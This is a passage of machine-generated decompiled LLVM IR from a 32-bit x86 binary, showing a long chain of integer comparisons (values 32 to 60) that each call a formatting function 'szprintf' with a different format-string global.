dec_label_pc_804a09f:                             ; preds = %dec_label_pc_804a099
  %v0_804a09f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a09f = zext i8 %v0_804a09f to i32
  store i32 %v1_804a09f, i32* @edx, align 4
  %v0_804a0ab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a0ab = zext i8 %v0_804a0ab to i32
  %v2_804a0ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ba, i32* @ebx, align 4
  %v5_804a0c1 = call i32 @szprintf(i32 %v2_804a0ba, i32 ptrtoint ([12 x i8]* @global_var_8058913.62 to i32), i32 %v1_804a0ab, i32 %v1_804a09f)
  br label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a099, %dec_label_pc_804a09f
  %v9_804a0c9 = icmp eq i32 %v11_8049ac4, 32
  %v1_804a0cd = icmp eq i1 %v9_804a0c9, false
  br i1 %v1_804a0cd, label %dec_label_pc_804a0f9, label %dec_label_pc_804a0cf

dec_label_pc_804a0cf:                             ; preds = %dec_label_pc_804a0c9
  %v0_804a0cf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a0cf = zext i8 %v0_804a0cf to i32
  store i32 %v1_804a0cf, i32* @edx, align 4
  %v0_804a0db = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a0db = zext i8 %v0_804a0db to i32
  %v2_804a0ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ea, i32* @ebx, align 4
  %v5_804a0f1 = call i32 @szprintf(i32 %v2_804a0ea, i32 ptrtoint ([11 x i8]* @global_var_805891f.63 to i32), i32 %v1_804a0db, i32 %v1_804a0cf)
  br label %dec_label_pc_804a0f9

dec_label_pc_804a0f9:                             ; preds = %dec_label_pc_804a0c9, %dec_label_pc_804a0cf
  %v12_804a0f9 = icmp eq i32 %v11_8049ac4, 33
  %v1_804a0fd = icmp eq i1 %v12_804a0f9, false
  br i1 %v1_804a0fd, label %dec_label_pc_804a129, label %dec_label_pc_804a0ff

dec_label_pc_804a0ff:                             ; preds = %dec_label_pc_804a0f9
  %v0_804a0ff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a0ff = zext i8 %v0_804a0ff to i32
  store i32 %v1_804a0ff, i32* @edx, align 4
  %v0_804a10b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a10b = zext i8 %v0_804a10b to i32
  %v2_804a11a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a11a, i32* @ebx, align 4
  %v5_804a121 = call i32 @szprintf(i32 %v2_804a11a, i32 ptrtoint ([12 x i8]* @global_var_805892a.64 to i32), i32 %v1_804a10b, i32 %v1_804a0ff)
  br label %dec_label_pc_804a129

dec_label_pc_804a129:                             ; preds = %dec_label_pc_804a0f9, %dec_label_pc_804a0ff
  %v12_804a129 = icmp eq i32 %v11_8049ac4, 34
  %v1_804a12d = icmp eq i1 %v12_804a129, false
  br i1 %v1_804a12d, label %dec_label_pc_804a159, label %dec_label_pc_804a12f

dec_label_pc_804a12f:                             ; preds = %dec_label_pc_804a129
  %v0_804a12f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a12f = zext i8 %v0_804a12f to i32
  store i32 %v1_804a12f, i32* @edx, align 4
  %v0_804a13b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a13b = zext i8 %v0_804a13b to i32
  %v2_804a14a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14a, i32* @ebx, align 4
  %v5_804a151 = call i32 @szprintf(i32 %v2_804a14a, i32 ptrtoint ([12 x i8]* @global_var_8058936.65 to i32), i32 %v1_804a13b, i32 %v1_804a12f)
  br label %dec_label_pc_804a159

dec_label_pc_804a159:                             ; preds = %dec_label_pc_804a129, %dec_label_pc_804a12f
  %v12_804a159 = icmp eq i32 %v11_8049ac4, 35
  %v1_804a15d = icmp eq i1 %v12_804a159, false
  br i1 %v1_804a15d, label %dec_label_pc_804a189, label %dec_label_pc_804a15f

dec_label_pc_804a15f:                             ; preds = %dec_label_pc_804a159
  %v0_804a15f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a15f = zext i8 %v0_804a15f to i32
  store i32 %v1_804a15f, i32* @edx, align 4
  %v0_804a16b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a16b = zext i8 %v0_804a16b to i32
  %v2_804a17a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a17a, i32* @ebx, align 4
  %v5_804a181 = call i32 @szprintf(i32 %v2_804a17a, i32 ptrtoint ([12 x i8]* @global_var_8058942.66 to i32), i32 %v1_804a16b, i32 %v1_804a15f)
  br label %dec_label_pc_804a189

dec_label_pc_804a189:                             ; preds = %dec_label_pc_804a159, %dec_label_pc_804a15f
  %v12_804a189 = icmp eq i32 %v11_8049ac4, 36
  %v1_804a18d = icmp eq i1 %v12_804a189, false
  br i1 %v1_804a18d, label %dec_label_pc_804a1b9, label %dec_label_pc_804a18f

dec_label_pc_804a18f:                             ; preds = %dec_label_pc_804a189
  %v0_804a18f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a18f = zext i8 %v0_804a18f to i32
  store i32 %v1_804a18f, i32* @edx, align 4
  %v0_804a19b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a19b = zext i8 %v0_804a19b to i32
  %v2_804a1aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1aa, i32* @ebx, align 4
  %v5_804a1b1 = call i32 @szprintf(i32 %v2_804a1aa, i32 ptrtoint ([12 x i8]* @global_var_805894e.67 to i32), i32 %v1_804a19b, i32 %v1_804a18f)
  br label %dec_label_pc_804a1b9

dec_label_pc_804a1b9:                             ; preds = %dec_label_pc_804a189, %dec_label_pc_804a18f
  %v12_804a1b9 = icmp eq i32 %v11_8049ac4, 37
  %v1_804a1bd = icmp eq i1 %v12_804a1b9, false
  br i1 %v1_804a1bd, label %dec_label_pc_804a1e9, label %dec_label_pc_804a1bf

dec_label_pc_804a1bf:                             ; preds = %dec_label_pc_804a1b9
  %v0_804a1bf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a1bf = zext i8 %v0_804a1bf to i32
  store i32 %v1_804a1bf, i32* @edx, align 4
  %v0_804a1cb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a1cb = zext i8 %v0_804a1cb to i32
  %v2_804a1da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1da, i32* @ebx, align 4
  %v5_804a1e1 = call i32 @szprintf(i32 %v2_804a1da, i32 ptrtoint ([12 x i8]* @global_var_805895a.68 to i32), i32 %v1_804a1cb, i32 %v1_804a1bf)
  br label %dec_label_pc_804a1e9

dec_label_pc_804a1e9:                             ; preds = %dec_label_pc_804a1b9, %dec_label_pc_804a1bf
  %v12_804a1e9 = icmp eq i32 %v11_8049ac4, 38
  %v1_804a1ed = icmp eq i1 %v12_804a1e9, false
  br i1 %v1_804a1ed, label %dec_label_pc_804a219, label %dec_label_pc_804a1ef

dec_label_pc_804a1ef:                             ; preds = %dec_label_pc_804a1e9
  %v0_804a1ef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a1ef = zext i8 %v0_804a1ef to i32
  store i32 %v1_804a1ef, i32* @edx, align 4
  %v0_804a1fb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a1fb = zext i8 %v0_804a1fb to i32
  %v2_804a20a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20a, i32* @ebx, align 4
  %v5_804a211 = call i32 @szprintf(i32 %v2_804a20a, i32 ptrtoint ([13 x i8]* @global_var_8058966.69 to i32), i32 %v1_804a1fb, i32 %v1_804a1ef)
  br label %dec_label_pc_804a219

dec_label_pc_804a219:                             ; preds = %dec_label_pc_804a1e9, %dec_label_pc_804a1ef
  %v12_804a219 = icmp eq i32 %v11_8049ac4, 39
  %v1_804a21d = icmp eq i1 %v12_804a219, false
  br i1 %v1_804a21d, label %dec_label_pc_804a249, label %dec_label_pc_804a21f

dec_label_pc_804a21f:                             ; preds = %dec_label_pc_804a219
  %v0_804a21f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a21f = zext i8 %v0_804a21f to i32
  store i32 %v1_804a21f, i32* @edx, align 4
  %v0_804a22b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a22b = zext i8 %v0_804a22b to i32
  %v2_804a23a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a23a, i32* @ebx, align 4
  %v5_804a241 = call i32 @szprintf(i32 %v2_804a23a, i32 ptrtoint ([13 x i8]* @global_var_8058973.70 to i32), i32 %v1_804a22b, i32 %v1_804a21f)
  br label %dec_label_pc_804a249

dec_label_pc_804a249:                             ; preds = %dec_label_pc_804a219, %dec_label_pc_804a21f
  %v12_804a249 = icmp eq i32 %v11_8049ac4, 40
  %v1_804a24d = icmp eq i1 %v12_804a249, false
  br i1 %v1_804a24d, label %dec_label_pc_804a279, label %dec_label_pc_804a24f

dec_label_pc_804a24f:                             ; preds = %dec_label_pc_804a249
  %v0_804a24f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a24f = zext i8 %v0_804a24f to i32
  store i32 %v1_804a24f, i32* @edx, align 4
  %v0_804a25b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a25b = zext i8 %v0_804a25b to i32
  %v2_804a26a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26a, i32* @ebx, align 4
  %v5_804a271 = call i32 @szprintf(i32 %v2_804a26a, i32 ptrtoint ([13 x i8]* @global_var_8058966.69 to i32), i32 %v1_804a25b, i32 %v1_804a24f)
  br label %dec_label_pc_804a279

dec_label_pc_804a279:                             ; preds = %dec_label_pc_804a249, %dec_label_pc_804a24f
  %v12_804a279 = icmp eq i32 %v11_8049ac4, 41
  %v1_804a27d = icmp eq i1 %v12_804a279, false
  br i1 %v1_804a27d, label %dec_label_pc_804a2a9, label %dec_label_pc_804a27f

dec_label_pc_804a27f:                             ; preds = %dec_label_pc_804a279
  %v0_804a27f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a27f = zext i8 %v0_804a27f to i32
  store i32 %v1_804a27f, i32* @edx, align 4
  %v0_804a28b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a28b = zext i8 %v0_804a28b to i32
  %v2_804a29a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29a, i32* @ebx, align 4
  %v5_804a2a1 = call i32 @szprintf(i32 %v2_804a29a, i32 ptrtoint ([13 x i8]* @global_var_8058980.71 to i32), i32 %v1_804a28b, i32 %v1_804a27f)
  br label %dec_label_pc_804a2a9

dec_label_pc_804a2a9:                             ; preds = %dec_label_pc_804a279, %dec_label_pc_804a27f
  %v12_804a2a9 = icmp eq i32 %v11_8049ac4, 42
  %v1_804a2ad = icmp eq i1 %v12_804a2a9, false
  br i1 %v1_804a2ad, label %dec_label_pc_804a2d9, label %dec_label_pc_804a2af

dec_label_pc_804a2af:                             ; preds = %dec_label_pc_804a2a9
  %v0_804a2af = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a2af = zext i8 %v0_804a2af to i32
  store i32 %v1_804a2af, i32* @edx, align 4
  %v0_804a2bb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a2bb = zext i8 %v0_804a2bb to i32
  %v2_804a2ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2ca, i32* @ebx, align 4
  %v5_804a2d1 = call i32 @szprintf(i32 %v2_804a2ca, i32 ptrtoint ([13 x i8]* @global_var_805898d.72 to i32), i32 %v1_804a2bb, i32 %v1_804a2af)
  br label %dec_label_pc_804a2d9

dec_label_pc_804a2d9:                             ; preds = %dec_label_pc_804a2a9, %dec_label_pc_804a2af
  %v12_804a2d9 = icmp eq i32 %v11_8049ac4, 43
  %v1_804a2dd = icmp eq i1 %v12_804a2d9, false
  br i1 %v1_804a2dd, label %dec_label_pc_804a309, label %dec_label_pc_804a2df

dec_label_pc_804a2df:                             ; preds = %dec_label_pc_804a2d9
  %v0_804a2df = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a2df = zext i8 %v0_804a2df to i32
  store i32 %v1_804a2df, i32* @edx, align 4
  %v0_804a2eb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a2eb = zext i8 %v0_804a2eb to i32
  %v2_804a2fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fa, i32* @ebx, align 4
  %v5_804a301 = call i32 @szprintf(i32 %v2_804a2fa, i32 ptrtoint ([13 x i8]* @global_var_805899a.73 to i32), i32 %v1_804a2eb, i32 %v1_804a2df)
  br label %dec_label_pc_804a309

dec_label_pc_804a309:                             ; preds = %dec_label_pc_804a2d9, %dec_label_pc_804a2df
  %v12_804a309 = icmp eq i32 %v11_8049ac4, 44
  %v1_804a30d = icmp eq i1 %v12_804a309, false
  br i1 %v1_804a30d, label %dec_label_pc_804a339, label %dec_label_pc_804a30f

dec_label_pc_804a30f:                             ; preds = %dec_label_pc_804a309
  %v0_804a30f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a30f = zext i8 %v0_804a30f to i32
  store i32 %v1_804a30f, i32* @edx, align 4
  %v0_804a31b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a31b = zext i8 %v0_804a31b to i32
  %v2_804a32a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a32a, i32* @ebx, align 4
  %v5_804a331 = call i32 @szprintf(i32 %v2_804a32a, i32 ptrtoint ([13 x i8]* @global_var_805898d.72 to i32), i32 %v1_804a31b, i32 %v1_804a30f)
  br label %dec_label_pc_804a339

dec_label_pc_804a339:                             ; preds = %dec_label_pc_804a309, %dec_label_pc_804a30f
  %v12_804a339 = icmp eq i32 %v11_8049ac4, 45
  %v1_804a33d = icmp eq i1 %v12_804a339, false
  br i1 %v1_804a33d, label %dec_label_pc_804a369, label %dec_label_pc_804a33f

dec_label_pc_804a33f:                             ; preds = %dec_label_pc_804a339
  %v0_804a33f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a33f = zext i8 %v0_804a33f to i32
  store i32 %v1_804a33f, i32* @edx, align 4
  %v0_804a34b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a34b = zext i8 %v0_804a34b to i32
  %v2_804a35a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a35a, i32* @ebx, align 4
  %v5_804a361 = call i32 @szprintf(i32 %v2_804a35a, i32 ptrtoint ([13 x i8]* @global_var_80589a7.74 to i32), i32 %v1_804a34b, i32 %v1_804a33f)
  br label %dec_label_pc_804a369

dec_label_pc_804a369:                             ; preds = %dec_label_pc_804a339, %dec_label_pc_804a33f
  %v12_804a369 = icmp eq i32 %v11_8049ac4, 46
  %v1_804a36d = icmp eq i1 %v12_804a369, false
  br i1 %v1_804a36d, label %dec_label_pc_804a399, label %dec_label_pc_804a36f

dec_label_pc_804a36f:                             ; preds = %dec_label_pc_804a369
  %v0_804a36f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a36f = zext i8 %v0_804a36f to i32
  store i32 %v1_804a36f, i32* @edx, align 4
  %v0_804a37b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a37b = zext i8 %v0_804a37b to i32
  %v2_804a38a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a38a, i32* @ebx, align 4
  %v5_804a391 = call i32 @szprintf(i32 %v2_804a38a, i32 ptrtoint ([13 x i8]* @global_var_80589b4.75 to i32), i32 %v1_804a37b, i32 %v1_804a36f)
  br label %dec_label_pc_804a399

dec_label_pc_804a399:                             ; preds = %dec_label_pc_804a369, %dec_label_pc_804a36f
  %v12_804a399 = icmp eq i32 %v11_8049ac4, 47
  %v1_804a39d = icmp eq i1 %v12_804a399, false
  br i1 %v1_804a39d, label %dec_label_pc_804a3c9, label %dec_label_pc_804a39f

dec_label_pc_804a39f:                             ; preds = %dec_label_pc_804a399
  %v0_804a39f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a39f = zext i8 %v0_804a39f to i32
  store i32 %v1_804a39f, i32* @edx, align 4
  %v0_804a3ab = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a3ab = zext i8 %v0_804a3ab to i32
  %v2_804a3ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ba, i32* @ebx, align 4
  %v5_804a3c1 = call i32 @szprintf(i32 %v2_804a3ba, i32 ptrtoint ([13 x i8]* @global_var_80589c1.76 to i32), i32 %v1_804a3ab, i32 %v1_804a39f)
  br label %dec_label_pc_804a3c9

dec_label_pc_804a3c9:                             ; preds = %dec_label_pc_804a399, %dec_label_pc_804a39f
  %v9_804a3c9 = icmp eq i32 %v11_8049ac4, 48
  %v1_804a3cd = icmp eq i1 %v9_804a3c9, false
  br i1 %v1_804a3cd, label %dec_label_pc_804a3f9, label %dec_label_pc_804a3cf

dec_label_pc_804a3cf:                             ; preds = %dec_label_pc_804a3c9
  %v0_804a3cf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a3cf = zext i8 %v0_804a3cf to i32
  store i32 %v1_804a3cf, i32* @edx, align 4
  %v0_804a3db = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a3db = zext i8 %v0_804a3db to i32
  %v2_804a3ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ea, i32* @ebx, align 4
  %v5_804a3f1 = call i32 @szprintf(i32 %v2_804a3ea, i32 ptrtoint ([13 x i8]* @global_var_80589ce.77 to i32), i32 %v1_804a3db, i32 %v1_804a3cf)
  br label %dec_label_pc_804a3f9

dec_label_pc_804a3f9:                             ; preds = %dec_label_pc_804a3c9, %dec_label_pc_804a3cf
  %v12_804a3f9 = icmp eq i32 %v11_8049ac4, 49
  %v1_804a3fd = icmp eq i1 %v12_804a3f9, false
  br i1 %v1_804a3fd, label %dec_label_pc_804a429, label %dec_label_pc_804a3ff

dec_label_pc_804a3ff:                             ; preds = %dec_label_pc_804a3f9
  %v0_804a3ff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a3ff = zext i8 %v0_804a3ff to i32
  store i32 %v1_804a3ff, i32* @edx, align 4
  %v0_804a40b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a40b = zext i8 %v0_804a40b to i32
  %v2_804a41a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41a, i32* @ebx, align 4
  %v5_804a421 = call i32 @szprintf(i32 %v2_804a41a, i32 ptrtoint ([13 x i8]* @global_var_80589db.78 to i32), i32 %v1_804a40b, i32 %v1_804a3ff)
  br label %dec_label_pc_804a429

dec_label_pc_804a429:                             ; preds = %dec_label_pc_804a3f9, %dec_label_pc_804a3ff
  %v12_804a429 = icmp eq i32 %v11_8049ac4, 50
  %v1_804a42d = icmp eq i1 %v12_804a429, false
  br i1 %v1_804a42d, label %dec_label_pc_804a459, label %dec_label_pc_804a42f

dec_label_pc_804a42f:                             ; preds = %dec_label_pc_804a429
  %v0_804a42f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a42f = zext i8 %v0_804a42f to i32
  store i32 %v1_804a42f, i32* @edx, align 4
  %v0_804a43b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a43b = zext i8 %v0_804a43b to i32
  %v2_804a44a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44a, i32* @ebx, align 4
  %v5_804a451 = call i32 @szprintf(i32 %v2_804a44a, i32 ptrtoint ([13 x i8]* @global_var_80589e8.79 to i32), i32 %v1_804a43b, i32 %v1_804a42f)
  br label %dec_label_pc_804a459

dec_label_pc_804a459:                             ; preds = %dec_label_pc_804a429, %dec_label_pc_804a42f
  %v12_804a459 = icmp eq i32 %v11_8049ac4, 51
  %v1_804a45d = icmp eq i1 %v12_804a459, false
  br i1 %v1_804a45d, label %dec_label_pc_804a489, label %dec_label_pc_804a45f

dec_label_pc_804a45f:                             ; preds = %dec_label_pc_804a459
  %v0_804a45f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a45f = zext i8 %v0_804a45f to i32
  store i32 %v1_804a45f, i32* @edx, align 4
  %v0_804a46b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a46b = zext i8 %v0_804a46b to i32
  %v2_804a47a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a47a, i32* @ebx, align 4
  %v5_804a481 = call i32 @szprintf(i32 %v2_804a47a, i32 ptrtoint ([14 x i8]* @global_var_80589f5.80 to i32), i32 %v1_804a46b, i32 %v1_804a45f)
  br label %dec_label_pc_804a489

dec_label_pc_804a489:                             ; preds = %dec_label_pc_804a459, %dec_label_pc_804a45f
  %v12_804a489 = icmp eq i32 %v11_8049ac4, 52
  %v1_804a48d = icmp eq i1 %v12_804a489, false
  br i1 %v1_804a48d, label %dec_label_pc_804a4b9, label %dec_label_pc_804a48f

dec_label_pc_804a48f:                             ; preds = %dec_label_pc_804a489
  %v0_804a48f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a48f = zext i8 %v0_804a48f to i32
  store i32 %v1_804a48f, i32* @edx, align 4
  %v0_804a49b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a49b = zext i8 %v0_804a49b to i32
  %v2_804a4aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4aa, i32* @ebx, align 4
  %v5_804a4b1 = call i32 @szprintf(i32 %v2_804a4aa, i32 ptrtoint ([13 x i8]* @global_var_8058a03.81 to i32), i32 %v1_804a49b, i32 %v1_804a48f)
  br label %dec_label_pc_804a4b9

dec_label_pc_804a4b9:                             ; preds = %dec_label_pc_804a489, %dec_label_pc_804a48f
  %v12_804a4b9 = icmp eq i32 %v11_8049ac4, 53
  %v1_804a4bd = icmp eq i1 %v12_804a4b9, false
  br i1 %v1_804a4bd, label %dec_label_pc_804a4e9, label %dec_label_pc_804a4bf

dec_label_pc_804a4bf:                             ; preds = %dec_label_pc_804a4b9
  %v0_804a4bf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a4bf = zext i8 %v0_804a4bf to i32
  store i32 %v1_804a4bf, i32* @edx, align 4
  %v0_804a4cb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a4cb = zext i8 %v0_804a4cb to i32
  %v2_804a4da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4da, i32* @ebx, align 4
  %v5_804a4e1 = call i32 @szprintf(i32 %v2_804a4da, i32 ptrtoint ([14 x i8]* @global_var_8058a10.82 to i32), i32 %v1_804a4cb, i32 %v1_804a4bf)
  br label %dec_label_pc_804a4e9

dec_label_pc_804a4e9:                             ; preds = %dec_label_pc_804a4b9, %dec_label_pc_804a4bf
  %v12_804a4e9 = icmp eq i32 %v11_8049ac4, 54
  %v1_804a4ed = icmp eq i1 %v12_804a4e9, false
  br i1 %v1_804a4ed, label %dec_label_pc_804a519, label %dec_label_pc_804a4ef

dec_label_pc_804a4ef:                             ; preds = %dec_label_pc_804a4e9
  %v0_804a4ef = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a4ef = zext i8 %v0_804a4ef to i32
  store i32 %v1_804a4ef, i32* @edx, align 4
  %v0_804a4fb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a4fb = zext i8 %v0_804a4fb to i32
  %v2_804a50a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a50a, i32* @ebx, align 4
  %v5_804a511 = call i32 @szprintf(i32 %v2_804a50a, i32 ptrtoint ([13 x i8]* @global_var_8058a1e.83 to i32), i32 %v1_804a4fb, i32 %v1_804a4ef)
  br label %dec_label_pc_804a519

dec_label_pc_804a519:                             ; preds = %dec_label_pc_804a4e9, %dec_label_pc_804a4ef
  %v12_804a519 = icmp eq i32 %v11_8049ac4, 55
  %v1_804a51d = icmp eq i1 %v12_804a519, false
  br i1 %v1_804a51d, label %dec_label_pc_804a549, label %dec_label_pc_804a51f

dec_label_pc_804a51f:                             ; preds = %dec_label_pc_804a519
  %v0_804a51f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a51f = zext i8 %v0_804a51f to i32
  store i32 %v1_804a51f, i32* @edx, align 4
  %v0_804a52b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a52b = zext i8 %v0_804a52b to i32
  %v2_804a53a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a53a, i32* @ebx, align 4
  %v5_804a541 = call i32 @szprintf(i32 %v2_804a53a, i32 ptrtoint ([14 x i8]* @global_var_8058a2b.84 to i32), i32 %v1_804a52b, i32 %v1_804a51f)
  br label %dec_label_pc_804a549

dec_label_pc_804a549:                             ; preds = %dec_label_pc_804a519, %dec_label_pc_804a51f
  %v12_804a549 = icmp eq i32 %v11_8049ac4, 56
  %v1_804a54d = icmp eq i1 %v12_804a549, false
  br i1 %v1_804a54d, label %dec_label_pc_804a579, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a549
  %v0_804a54f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a54f = zext i8 %v0_804a54f to i32
  store i32 %v1_804a54f, i32* @edx, align 4
  %v0_804a55b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a55b = zext i8 %v0_804a55b to i32
  %v2_804a56a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a56a, i32* @ebx, align 4
  %v5_804a571 = call i32 @szprintf(i32 %v2_804a56a, i32 ptrtoint ([14 x i8]* @global_var_8058a39.85 to i32), i32 %v1_804a55b, i32 %v1_804a54f)
  br label %dec_label_pc_804a579

dec_label_pc_804a579:                             ; preds = %dec_label_pc_804a549, %dec_label_pc_804a54f
  %v12_804a579 = icmp eq i32 %v11_8049ac4, 57
  %v1_804a57d = icmp eq i1 %v12_804a579, false
  br i1 %v1_804a57d, label %dec_label_pc_804a5a9, label %dec_label_pc_804a57f

dec_label_pc_804a57f:                             ; preds = %dec_label_pc_804a579
  %v0_804a57f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a57f = zext i8 %v0_804a57f to i32
  store i32 %v1_804a57f, i32* @edx, align 4
  %v0_804a58b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a58b = zext i8 %v0_804a58b to i32
  %v2_804a59a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a59a, i32* @ebx, align 4
  %v5_804a5a1 = call i32 @szprintf(i32 %v2_804a59a, i32 ptrtoint ([13 x i8]* @global_var_8058a47.86 to i32), i32 %v1_804a58b, i32 %v1_804a57f)
  br label %dec_label_pc_804a5a9

dec_label_pc_804a5a9:                             ; preds = %dec_label_pc_804a579, %dec_label_pc_804a57f
  %v12_804a5a9 = icmp eq i32 %v11_8049ac4, 58
  %v1_804a5ad = icmp eq i1 %v12_804a5a9, false
  br i1 %v1_804a5ad, label %dec_label_pc_804a5d9, label %dec_label_pc_804a5af

dec_label_pc_804a5af:                             ; preds = %dec_label_pc_804a5a9
  %v0_804a5af = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a5af = zext i8 %v0_804a5af to i32
  store i32 %v1_804a5af, i32* @edx, align 4
  %v0_804a5bb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a5bb = zext i8 %v0_804a5bb to i32
  %v2_804a5ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5ca, i32* @ebx, align 4
  %v5_804a5d1 = call i32 @szprintf(i32 %v2_804a5ca, i32 ptrtoint ([13 x i8]* @global_var_8058a54.87 to i32), i32 %v1_804a5bb, i32 %v1_804a5af)
  br label %dec_label_pc_804a5d9

dec_label_pc_804a5d9:                             ; preds = %dec_label_pc_804a5a9, %dec_label_pc_804a5af
  %v12_804a5d9 = icmp eq i32 %v11_8049ac4, 59
  %v1_804a5dd = icmp eq i1 %v12_804a5d9, false
  br i1 %v1_804a5dd, label %dec_label_pc_804a609, label %dec_label_pc_804a5df

dec_label_pc_804a5df:                             ; preds = %dec_label_pc_804a5d9
  %v0_804a5df = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a5df = zext i8 %v0_804a5df to i32
  store i32 %v1_804a5df, i32* @edx, align 4
  %v0_804a5eb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a5eb = zext i8 %v0_804a5eb to i32
  %v2_804a5fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a5fa, i32* @ebx, align 4
  %v5_804a601 = call i32 @szprintf(i32 %v2_804a5fa, i32 ptrtoint ([13 x i8]* @global_var_8058a61.88 to i32), i32 %v1_804a5eb, i32 %v1_804a5df)
  br label %dec_label_pc_804a609

dec_label_pc_804a609:                             ; preds = %dec_label_pc_804a5d9, %dec_label_pc_804a5df
  %v12_804a609 = icmp eq i32 %v11_8049ac4, 60
  %v1_804a60d = icmp eq i1 %v12_804a609, false
  br i1 %v1_804a60d, label %dec_label_pc_804a639, label %dec_label_pc_804a60f

dec_label_pc_804a60f:                             ; preds = %dec_label_pc_804a609
  %v0_804a60f = load i8, i8* @global_var_805f8da.30, align 2
  %v1_804a60f = zext i8 %v0_804a60f to i32
  store i32 %v1_804a60f, i32* @edx, align 4
  %v0_804a61b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_804a61b = zext i8 %v0_804a61b to i32
  %v2_804a62a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a62a, i32* @ebx, align 4
  %v5_804a631 = call i32 @szprintf(i32 %v2_804a62a, i32 ptrtoint ([13 x i8]* @global_var_8058a6e.89 to i32), i32 %v1_804a61b, i32 %v1_804a60f)
  br label %dec_label_pc_804a639

dec_label_pc_804a639:                             ; preds = %dec_label_pc_804a609, %dec_label_pc_804a60f
